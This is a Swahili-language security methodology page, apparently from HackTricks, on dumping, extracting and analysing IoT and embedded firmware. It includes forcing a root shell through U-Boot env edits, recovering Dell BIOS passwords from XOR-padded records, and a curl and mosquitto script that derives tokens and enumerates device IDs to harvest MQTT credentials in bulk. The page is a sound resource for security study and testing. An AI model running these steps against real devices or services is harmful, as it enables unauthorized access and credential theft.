# Uchambuzi wa Firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Utangulizi**

### Rasilimali zinazohusiana

Kwa kupata firmware kupitia interfaces za hardware zilizo wazi, angalia [UART console-assisted firmware dumping](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) na [SPI flash dumping](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Kwa kunasa UART wakati wa kuwasha kifaa kwa njia inayoweza kurudiwa kabla ya kupata console, angalia [SCPI-controlled power and oscilloscope acquisition](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ni programu muhimu inayowezesha vifaa kufanya kazi ipasavyo kwa kudhibiti na kuwezesha mawasiliano kati ya vipengele vya hardware na programu ambazo watumiaji hutumia. Huhifadhiwa kwenye kumbukumbu isiyofutika, na hivyo kuhakikisha kuwa kifaa kinaweza kupata maelekezo muhimu mara tu kinapowashwa, jambo linalosababisha mfumo wa uendeshaji kuanza. Kuchunguza na, ikiwezekana, kurekebisha firmware ni hatua muhimu katika kutambua udhaifu wa kiusalama.<sup>[[2]](#references)[[3]](#references)</sup>

## **Kukusanya Taarifa**

**Kukusanya taarifa** ni hatua muhimu ya awali katika kuelewa muundo wa kifaa na teknolojia zinazotumika ndani yake. Mchakato huu unahusisha kukusanya data kuhusu:

- Usanifu wa CPU na mfumo wa uendeshaji unaotumia
- Maelezo mahususi ya bootloader
- Muundo wa hardware na datasheet
- Vipimo vya codebase na maeneo ya chanzo
- Maktaba za nje na aina za leseni
- Historia ya masasisho na vyeti vya udhibiti
- Michoro ya usanifu na mtiririko
- Tathmini za usalama na udhaifu uliotambuliwa

Kwa madhumuni haya, zana za **open-source intelligence (OSINT)** ni muhimu sana, kama ilivyo uchanganuzi wa vipengele vyovyote vya open-source software vinavyopatikana kupitia michakato ya ukaguzi wa mikono na kiotomatiki. Zana kama [Coverity Scan](https://scan.coverity.com) na [Semmle’s LGTM](https://lgtm.com/#explore) hutoa uchanganuzi tuli bila malipo unaoweza kutumiwa kutafuta matatizo yanayoweza kuwepo.

## **Kupata Firmware**

Firmware inaweza kupatikana kwa njia mbalimbali, kila moja ikiwa na kiwango chake cha ugumu:

- Kuipata **moja kwa moja** kutoka kwa chanzo (watengenezaji programu, wazalishaji)
- **Kuijenga** kwa kufuata maelekezo yaliyotolewa
- **Kuipakua** kutoka tovuti rasmi za usaidizi
- Kutumia hoja za **Google dork** kutafuta faili za firmware zilizowekwa mtandaoni
- Kufikia **cloud storage** moja kwa moja, kwa kutumia zana kama [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Kunasa **masasisho** kwa kutumia mbinu za man-in-the-middle
- **Kuichota** kutoka kwenye kifaa kupitia miunganisho kama **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash), au **PICit**
- **Kunasa** maombi ya masasisho ndani ya mawasiliano ya kifaa
- Kutambua na kutumia **endpoint za masasisho zilizowekwa kwenye code**
- **Kuidump** kutoka kwenye bootloader au mtandao
- **Kuondoa na kusoma** chipu ya hifadhi, ikiwa njia nyingine zote hazijafaulu, kwa kutumia zana zinazofaa za hardware

### Logi za UART pekee: lazimisha root shell kupitia mazingira ya U-Boot kwenye flash

Ikiwa UART RX inapuuzwa (logi pekee ndizo zinazopatikana), bado unaweza kulazimisha init shell kwa **kuhariri blob ya mazingira ya U-Boot ukiwa nje ya kifaa**:<sup>[[6]](#references)</sup>

1. Dump SPI flash kwa kutumia klipu ya SOIC-8 na programmer (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Tafuta partition ya U-Boot env, hariri `bootargs` ili ijumuishe `init=/bin/sh`, na **kokotoa upya U-Boot env CRC32** ya blob.
3. Flash upya partition ya env pekee na uwashe upya; shell inapaswa kuonekana kupitia UART.

Hii ni muhimu kwenye vifaa vilivyopachikwa ambapo shell ya bootloader imezimwa lakini partition ya env inaweza kuandikiwa kupitia ufikiaji wa nje wa flash.

### Kufichua code iliyolindwa kupitia kazi ya kunakili ya Firewall

Baadhi ya MCU huruhusu code ya programu isiyolindwa kuita gateway ya eneo lililolindwa badala ya kusoma Flash iliyolindwa moja kwa moja. Baada ya kupata uwezo wa kutekeleza code ya programu, kagua kila gateway task kama primitive tofauti ya kuhamisha kumbukumbu. Katika kisa cha Cypherock X1, STM32L4 Firewall call gate ilikubali task, pointer ya nje ya `data`, urefu, na `address` iliyolindwa. Task ya kuandika ilishindwa kukataa pointer ya chanzo cha `data` iliyoelekeza kwenye Firewall Code. Mpigaji hakuweza kusoma code hiyo moja kwa moja, lakini gateway yenyewe ingeweza kuinakili kwenye hifadhi isiyobadilika iliyolindwa ambayo task ya kusoma iliyoruhusiwa ingeweza kufichua.<sup>[[15]](#references)</sup>

Ili kurudia aina hii ya ufichuaji, tambua ukurasa wa hifadhi unaoweza kuandikiwa katika eneo lililolindwa, wenye task ya kusoma inayolingana; weka chanzo cha kuandika kwenye anwani zinazofuatana za code iliyolindwa, kisha soma tena baiti zilizohifadhiwa kwa muda. Kagua hifadhi kabla ya kurudia uandishi: katika kisa hiki ilikuwa Flash, kwa hiyo ukurasa ulihitaji kufutwa kabla ya kutumiwa tena. Watafiti walitumia utaratibu uliofuta na kurejesha maudhui halali ya Secure Data Storage, kisha wakaweka code kwenye nafasi iliyobaki wazi badala ya kufuta data ya wallet. Hili linahitaji uwezo wa kutekeleza code kwenye MCU na call gate inayoweza kufikiwa; si njia ya moja kwa moja ya kukwepa usomaji kutoka kwa host isiyo na uthibitishaji.<sup>[[15]](#references)</sup>

Code iliyorejeshwa inaweza kufichua [mapengo ya uaminifu katika masasisho ya firmware na uadilifu wa boot](firmware-integrity.md#fragmented-update-state-and-writable-integrity-metadata).<sup>[[15]](#references)</sup>

## Kuchanganua firmware

Sasa kwa kuwa **una firmware**, unahitaji kutoa taarifa kuihusu ili ujue jinsi ya kuichunguza. Hizi ni baadhi ya zana unazoweza kutumia:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Ikiwa hutapata mengi kwa kutumia zana hizo, kagua **entropy** ya image kwa `binwalk -E <bin>`. Ikiwa entropy ni ndogo, basi huenda haijasimbwa kwa njia fiche. Ikiwa entropy ni kubwa, huenda imesimbwa kwa njia fiche (au imebanwa kwa namna fulani).

Zaidi ya hayo, unaweza kutumia zana hizi kutoa **files zilizopachikwa ndani ya firmware**:

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Au tumia [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kukagua file.

### Vipengee ghafi vya kuonyesha vilivyo kwenye flash ya nje

Dump ya SPI ya nje si lazima iwe firmware inayotekelezwa na MCU. Kwa kifaa lengwa cha Cortex-M, linganisha mwanzo wa kila eneo linaloweza kuwa na code na memory map ya kifaa: vector table ya kawaida huanza na anwani inayowezekana ya SRAM stack pointer na anwani ya reset handler iliyo kwenye memory inayotekelezeka. Kukosekana kwa vector table kwenye offset sifuri pekee hakuthibitishi kuwa chip nzima haina code; kagua offset nyingine na mpangilio wa boot. Ikiwa `binwalk` haitapata container, kagua bytes ghafi na ulinganishe anwani za usomaji wa flash na vitendo vinavyopakia skrini mpya, ukitumia [decoded SPI capture](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer).<sup>[[14]](#references)</sup>

Kwa eneo la display-asset, jaribu pixel formats na dimensions zinazowezekana badala ya kudhani ni PNG/JPEG. Kifaa kilichotajwa kilitumia fremu za **80×160 RGB565 little-endian**: kwa bytes mbili kwa pixel, fremu moja ina **25,600 bytes** (25 KiB), si kilobits 24. Anwani ya usomaji wa flash iliyodekodishwa ilibainisha offset ya screen asset; mtafiti alibadilisha image iliyotayarishwa kwa `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, akaweka asset yenye ukubwa sawa badala ya ile ya awali kwenye dump, akaiandika kwa `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin`, kisha akathibitisha kuwa image mpya ilionekana kwenye display. Hili linaonyesha kuwa *external display assets* zinaweza kuandikwa, si kwamba firmware ya ndani ya MCU inaweza kutolewa au kuandikwa upya. Hifadhi dump ya awali na uthibitishe dimensions, byte order, offset, na urefu wa data itakayobadilishwa kabla ya kuandika.<sup>[[14]](#references)</sup>

### Uchambuzi wa tofauti za flash na hifadhi za siri za XOR zinazoweza kurejeshwa

Ikiwa setting ya firmware haina muundo wa hifadhi ulioandikwa kwenye nyaraka, kwanza soma flash mara kadhaa kwa hali zinazolingana, badilisha **setting moja tu**, kisha dump chip nzima tena na ulinganishe offset. Kurudia jaribio kwa thamani zinazodhibitiwa husaidia kutofautisha setting hiyo na counters pamoja na metadata ya uandishi; mabadiliko kwenye offset mpya badala ya eneo lilelile yanaashiria hifadhi ya append-only au log-structured. Hifadhi entries zilizofutwa au zilizowekewa tombstone kwa sababu bytes za payload zake zinaweza bado kurejeshwa.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Baada ya kupata eneo hilo, toa moduli za firmware kwa kutumia zana kama `binwalk`, kisha fanya reverse engineering ya writer/validator katika Ghidra. Thibitisha mipaka ya field, padding, key indexing na key derivation kwenye code badala ya kukisia scheme kutokana na mifumo ya ciphertext pekee.<sup>[[12]](#references)</sup>

#### Rejesha funguo kutoka kwenye padding ya sifuri iliyosimbwa

Kama ilivyoelezwa katika [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), known plaintext hufichua baiti za keystream zilizo kwenye offsets zilezile. Field yenye ukubwa usiobadilika huwa hatarini hasa padding yake ya sifuri inapofunika kila index ya XOR key inayojirudia: padding iliyosimbwa hufichua baiti hizo za key moja kwa moja, kwa kuwa `0x00 XOR key_byte = key_byte`. Ikiwa kila index ya key imefunikwa, jenga upya key kutoka mwisho wa ciphertext na usimbue data iliyojazwa.<sup>[[12]](#references)</sup>

Muundo wa DVAR BIOS-password wa Dell ulio hatarini ni mfano halisi: baiti ya `0` katika field yenye baiti 32 iko wazi, huku baiti `1..31` zikitumia key inayojirudia yenye baiti 20.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Kwa urefu wa nenosiri `L`, nafasi za `L..31` zilikuwa sifuri kabla ya XOR. Wakati `L <= 12`, nafasi hizo zinajumuisha kila faharasa ya ufunguo, kwa hivyo ufunguo na nenosiri kamili hupatikana bila brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Inua funguo kutoka rekodi za kihistoria

Usichanganue kila rekodi kivyake. Ufunguo wa DVAR hukokotolewa takribani kama `modified_md5(device_seed || variable_GUID || password[0])`: device seed na GUID hazibadiliki, na ingizo pekee linalotegemea password ni baiti ya kwanza iliyo wazi. Hii hutoa hadi funguo 256 kwa kila kifaa na kusababisha rekodi zinazoanza kwa baiti ileile kushiriki ufunguo mmoja. Panga rekodi zinazotumika na zilizofutwa kulingana na baiti hiyo; rekodi fupi ya zamani inaweza ku-leak ufunguo mzima kupitia padding na kusimbua rekodi mpya ndefu zaidi ambayo padding yake yenyewe haitoshi. Kwa hiyo, kubadilisha password kunaweza kuongeza hatari ikiwa ciphertext za zamani zinawekewa alama ya kufutwa badala ya kufutwa kabisa.<sup>[[12]](#references)</sup>

Zana ya [`dellpwn`](https://github.com/R3n5k1/dellpwn) hutafuta DVAR, huthibitisha rekodi zinazowezekana, hurejesha password, na inaweza kuonyesha baiti ghafi zilizohifadhiwa/za ufunguo. Iunde kutoka kwenye checkout na uchanganue picha ya flash iliyothibitishwa kama ifuatavyo:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Kwa custom parsers, kataa matokeo chanya ya uongo kwa kutumia muundo wa rekodi, masharti ya herufi zinazochapishika, ukaguzi wa padding ya sufuri, entropy ya ufunguo, na uthabiti pale ufunguo unapozunguka. Ikiwa dumps zinazorudiwa zinaonyesha mabadiliko machache ya biti kwa kila write, orodhesha masks zilizobainika na upange marekebisho kwa kutumia masharti haya, lakini ripoti herufi zisizo na uhakika badala ya kuwasilisha matokeo ya heuristic kana kwamba ni urejeshaji kamili.<sup>[[12]](#references)</sup>

Password verifiers zinapaswa kuhifadhi salted, iterated one-way hash badala ya ciphertext inayoweza kurejeshwa, na log-structured stores zinapaswa kuondoa kwa usalama nyenzo za siri zilizopitwa na wakati.<sup>[[12]](#references)</sup>

### Kupata Filesystem

Kwa kutumia tools zilizotajwa awali zenye maoni, kama `binwalk -ev <bin>`, unapaswa kuwa umeweza **kutoa filesystem**.\
Binwalk kwa kawaida huiondoa ndani ya **folda yenye jina la aina ya filesystem**, ambayo kwa kawaida huwa mojawapo ya hizi: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Kutoa Filesystem kwa Mkono

Wakati mwingine, binwalk **haitakuwa na magic byte ya filesystem kwenye signatures zake**. Katika hali hizi, tumia binwalk **kutafuta offset ya filesystem na kukata filesystem iliyobanwa** kutoka kwenye binary, kisha **utoe filesystem kwa mkono** kulingana na aina yake kwa kutumia hatua zilizo hapa chini.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Tekeleza amri ifuatayo ya **dd** ili kufanya carving ya mfumo wa faili wa Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Vinginevyo, amri ifuatayo pia inaweza kutekelezwa.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Kwa squashfs (iliyotumika kwenye mfano hapo juu)

`$ unsquashfs dir.squashfs`

Baadaye, faili zitakuwa kwenye saraka ya "`squashfs-root`".

- Faili za kumbukumbu za CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Kwa filesystem za jffs2

`$ jefferson rootfsfile.jffs2`

- Kwa filesystem za ubifs zinazotumia NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Kuunda upya root filesystem zilizogawanywa za embedded

Ikiwa raw eMMC/SSD dump ina header halali ya filesystem lakini offsets za metadata zake zinafika nje ya mipaka ya partition inayotarajiwa, usiihukumu mara moja kuwa imeharibika. Boot code ya embedded inaweza kuunganisha kifaa halisi cha root kutoka kwenye safu nyingi za kimwili kwa kutumia Device Mapper, kwa hiyo kutoa data kutoka kwenye partition moja ya GPT hutoa sehemu ya kwanza pekee.<sup>[[9]](#references)</sup>

#### Tathmini ya awali ya picha nzima ya media

Kwanza hakikisha kwamba upataji umekamilika, ukubwa wa faili ni thabiti, na hakuna mchakato wa kuandika unaoendelea kuitumia. Ikiwa jina la faili linaonyesha anwani ya mwanzo/mwisho, linganisha safu hiyo na idadi halisi ya byte. Rejesha GPT katika hali ya kusoma pekee na uambatishe safu inayohitajika tu; **usiendeshe** `vgchange -ay` kwenye physical volume isiyoaminika kwenye workstation, kwa sababu migongano ya volume group na uandishi usiokusudiwa vinaweza kutokea.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Pendelea kutumia VM inayoweza kutupwa ikiwa logic ya awali ya init au stack ya LVM inahitaji kuona image nzima. Boot logs za kihistoria kutoka kwenye partition ya kawaida ya boot ni muhimu hasa: bootloader huenda ilinakili offsets za proprietary-container, urefu wa components, uteuzi wa slot, kanuni za alignment na uthibitishaji wa signature. Tumia thamani hizo kutenganisha command line/kernel/initramfs iliyopachikwa, kisha thibitisha kila matokeo kivyake kwa `file`, magic bytes na `binwalk`; kusoma hadi mwisho wa container kunaweza kuongeza initrd, object ya ACPI au signature kwenye kernel kimakosa.<sup>[[9]](#references)</sup>

#### Rejesha ramani ya block ya wakati wa boot

Toa initramfs ya kernel na uchanganue kinyume `/init` yake pamoja na library zozote za storage. Katika [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), fuata marejeleo ya string za `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` na njia za partition; kisha fuatilia code inayochagua slot amilifu ya A/B na kuunda jedwali. Sehemu nzuri za kuanzia katika radare2 ni `r2 -A init`, `afl`, `pdf @ main` na `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Target ya linear huweka masafa yanayofuatana ya kifaa pepe kwenye masafa ya kifaa kimoja au zaidi vinavyotoa hifadhi. Jedwali la sehemu mbili lililorejeshwa huwa na muundo huu (nafasi na urefu wote ni sekta za baiti 512):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Rudia hesabu za machine-code kwa usahihi, ikijumuisha upana wa integer, shifts na ubadilishaji wa vipimo. Kwa mfano, usemi ufuatao hukata ukubwa wa byte hadi mpaka wa 4-KiB na ndipo tu kuubadilisha kuwa sectors za 512-byte; kuubadilisha na `p4_bytes // 512` huhamisha sehemu ya mwisho iliyochaguliwa kwa `p4_bytes % 4096` kila mara partition inapokuwa haijaambatanishwa na page.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Rekonstrua picha bapa ya uchanganuzi kwa kunakili safu kwa mpangilio wa jedwali, kwa kutumia vipande vyenye ukubwa uliowekewa kikomo badala ya kupakia dump nzima ya media kwenye memory. Hii pia huepusha kuunda vifaa vya mapper upande wa host. Hifadhi offsets zilizotokana na GPT, idadi za sekta zilizogeuzwa, na urefu wa matokeo kama madai tofauti.<sup>[[9]](#references)</sup>

#### Tofautisha uharibifu na hitilafu ya mara kwa mara ya uundaji upya

Kwa SquashFS, hakikisha kuwa magic ni `hsqs` na usimbue uga wa little-endian wa biti 64 `bytes_used` kwenye offset 40 ya superblock kabla ya kuendesha `unsquashfs`. Ikiwa uchimbuaji utashindwa katika miundo kadhaa isiyohusiana, tafuta katika eneo pana linalozunguka nafasi zinazotarajiwa na utake wagombeaji wenye miundo thabiti: block ya metadata inayoweza decompressed, maingizo kadhaa ya saraka yanayofuatana na yaliyo halali, uga za inode zinazowezekana, inode ya root inayolingana na idadi ya inode, au muundo halali wa integrity-metadata. Kulingana na ulinganifu mmoja wa magic pekee hakutoshi.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Wakati delta ileile yenye saini inafanya miundo huru iwe halali—kwa mfano, metadata ya directory na rekodi ya verity—chanzo kinachowezekana zaidi ni hitilafu ya kimfumo ya mwanzo wa segment badala ya bytes zilizokosekana. Rudi kwenye hesabu iliyogeuzwa na utafute mabaki yaliyotupwa, signedness, overflow, au rounding ya sector/page kabla ya kujaribu kurejesha orphan au kurekebisha metadata ya filesystem.<sup>[[9]](#references)</sup>

Hatimaye, weka mipaka ya ulinzi tofauti: volumes za LUKS zilizofungwa kwa TPM hulinda usiri wa data, ilhali mapping ya dm-verity yenye saini hulinda integrity ya root filesystem. TPM ya software haiwezi kurejesha key iliyofungwa kwa TPM halisi ya awali, na kuwasha SquashFS iliyorekebishwa kupitia init ya utafiti pekee inayoacha uthibitishaji wa verity hakubuni saini yake wala kuvunja dm-verity.<sup>[[9]](#references)</sup>

## Analyzing Firmware

Firmware inapopatikana, ni muhimu kuichambua ili kuelewa muundo wake na udhaifu unaoweza kuwepo. Mchakato huu unahusisha kutumia zana mbalimbali kuchanganua na kutoa data muhimu kutoka kwenye image ya firmware.

### Zana za Awali za Uchambuzi

Seti ya amri imetolewa kwa ukaguzi wa awali wa faili ya binary (inayorejelewa kama `<bin>`). Amri hizi husaidia kutambua aina za faili, kutoa strings, kuchanganua data ya binary, na kuelewa maelezo ya partition na filesystem:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Ili kutathmini hali ya usimbaji fiche ya image, hukaguliwa **entropy** kwa kutumia `binwalk -E <bin>`. **Entropy** ya chini huashiria kutokuwepo kwa usimbaji fiche, ilhali **entropy** ya juu huashiria uwezekano wa usimbaji fiche au ukandamizaji.

Kwa kutoa **embedded files**, inapendekezwa kutumia zana na nyenzo kama nyaraka za **file-data-carving-recovery-tools** na **binvis.io** kwa ukaguzi wa faili.

### Kutoa Filesystem

Kwa kutumia `binwalk -ev <bin>`, kwa kawaida mtu anaweza kutoa filesystem, mara nyingi kwenye saraka inayopewa jina la aina ya filesystem (kwa mfano, squashfs, ubifs). Hata hivyo, **binwalk** inaposhindwa kutambua aina ya filesystem kwa sababu ya kukosekana kwa magic bytes, utoaji wa faili kwa mikono huhitajika. Hii huhusisha kutumia `binwalk` kupata offset ya filesystem, kisha kutumia amri ya `dd` kuchonga filesystem:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Baadaye, kulingana na aina ya filesystem (k.m., squashfs, cpio, jffs2, ubifs), hutumika commands tofauti ili kutoa maudhui kwa mikono.

### Uchambuzi wa Filesystem

Baada ya kutoa filesystem, huanza kutafuta dosari za usalama. Huchunguzwa daemons za mtandao zisizo salama, credentials zilizowekwa moja kwa moja kwenye code, API endpoints, utendaji wa update server, code ambayo haijacompile, startup scripts, na compiled binaries kwa ajili ya uchambuzi wa offline.

**Maeneo muhimu** na **vitu** vya kukagua ni pamoja na:

- **etc/shadow** na **etc/passwd** kwa credentials za watumiaji
- Vyeti na keys za SSL katika **etc/ssl**
- Configuration na script files kwa uwezekano wa udhaifu
- Binaries zilizopachikwa kwa uchambuzi zaidi
- Web servers na binaries zinazotumiwa sana kwenye vifaa vya IoT

Tools kadhaa husaidia kufichua taarifa nyeti na udhaifu ndani ya filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) na [**Firmwalker**](https://github.com/craigz28/firmwalker) kwa kutafuta taarifa nyeti
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) kwa uchambuzi wa kina wa firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), na [**EMBA**](https://github.com/e-m-b-a/emba) kwa uchambuzi wa static na dynamic

### Ukaguzi wa Usalama wa Compiled Binaries

Source code na compiled binaries zinazopatikana kwenye filesystem lazima zichunguzwe kwa makini ili kubaini udhaifu. Tools kama **checksec.sh** kwa Unix binaries na **PESecurity** kwa Windows binaries husaidia kutambua binaries zisizolindwa ambazo zinaweza kutumiwa vibaya.

## Kukusanya cloud config na credentials za MQTT kupitia tokens zinazotokana na URL

Hubs nyingi za IoT huchukua configuration ya kila kifaa kutoka kwenye cloud endpoint inayoonekana hivi:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Wakati wa uchambuzi wa firmware unaweza kugundua kuwa `<token>` hutokana na kifaa chenyewe kwa kutumia device ID na secret iliyowekwa moja kwa moja kwenye code, kwa mfano:

- token = MD5( deviceId || STATIC_KEY ) na huwakilishwa kama hex ya herufi kubwa

Muundo huu humwezesha yeyote anayejua deviceId na STATIC_KEY kutengeneza upya URL na kupata cloud config, ambayo mara nyingi hufichua credentials za MQTT zilizo kwenye plaintext na topic prefixes.

Utaratibu wa vitendo:

1) Toa deviceId kutoka kwenye UART boot logs

- Unganisha adapta ya UART ya 3.3V (TX/RX/GND) na unasa logs:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Tafuta mistari inayochapisha muundo wa URL ya cloud config na anwani ya broker, kwa mfano:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Rejesha STATIC_KEY na algorithm ya token kutoka kwenye firmware

- Pakia binaries kwenye Ghidra/radare2 na utafute njia ya config ("/pf/") au matumizi ya MD5.
- Thibitisha algorithm (k.m., MD5(deviceId||STATIC_KEY)).
- Tengeneza token katika Bash na uandike digest kwa herufi kubwa:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Kusanya config ya cloud na credentials za MQTT

- Unda URL na upakue JSON kwa curl; ichanganue kwa jq ili kutoa secrets:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Tumia vibaya MQTT ya maandishi wazi na ACL dhaifu za topic (ikiwa zipo)

- Tumia credentials zilizopatikana kujiandikisha kwenye topics za maintenance na kutafuta matukio nyeti:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Orodhesha vitambulisho vya vifaa vinavyotabirika (kwa kiwango kikubwa, ukiwa na idhini)

- Mifumo mingi hujumuisha baiti za OUI ya mtengenezaji/bidhaa/aina zikifuatiwa na kiambishi tamati cha mfuatano.
- Unaweza kupitia vitambulisho vinavyowezekana, kutengeneza tokens na kupata configs kwa njia ya programu:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Vidokezo
- Pata idhini ya wazi kila wakati kabla ya kujaribu kufanya enumeration kwa wingi.
- Inapowezekana, pendelea emulation au static analysis ili kupata siri bila kurekebisha hardware lengwa.

Mchakato wa ku-emulate firmware huwezesha **dynamic analysis** ya uendeshaji wa kifaa au programu mahususi. Mbinu hii inaweza kukumbana na changamoto zinazohusiana na hardware au utegemezi wa architecture, lakini kuhamisha root filesystem au binary mahususi kwenye kifaa chenye architecture na endianness zinazolingana, kama Raspberry Pi, au kwenye virtual machine iliyotayarishwa awali, kunaweza kurahisisha majaribio zaidi.

### Ku-emulate Binary Mahususi

Unapochunguza programu moja, ni muhimu kutambua endianness na CPU architecture ya programu hiyo.

#### Mfano wa MIPS Architecture

Ili ku-emulate binary ya MIPS architecture, unaweza kutumia amri:

```bash
file ./squashfs-root/bin/busybox
```

Na ili kusakinisha zana muhimu za uigaji:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Kwa MIPS (big-endian), hutumika `qemu-mips`; kwa binaries za little-endian, chaguo ni `qemu-mipsel`.

#### Uigaji wa Usanifu wa ARM

Kwa binaries za ARM, mchakato unafanana, huku emulator ya `qemu-arm` ikitumika kwa uigaji.

### Uigaji Kamili wa Mfumo

Zana kama [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), na nyinginezo hurahisisha uigaji kamili wa firmware, huendesha mchakato kiotomatiki na kusaidia katika uchanganuzi wa wakati wa utekelezaji.

### Kujenga upya mifumo ya faili ya root iliyogawanywa na kuthibitishwa kwa ajili ya uigaji

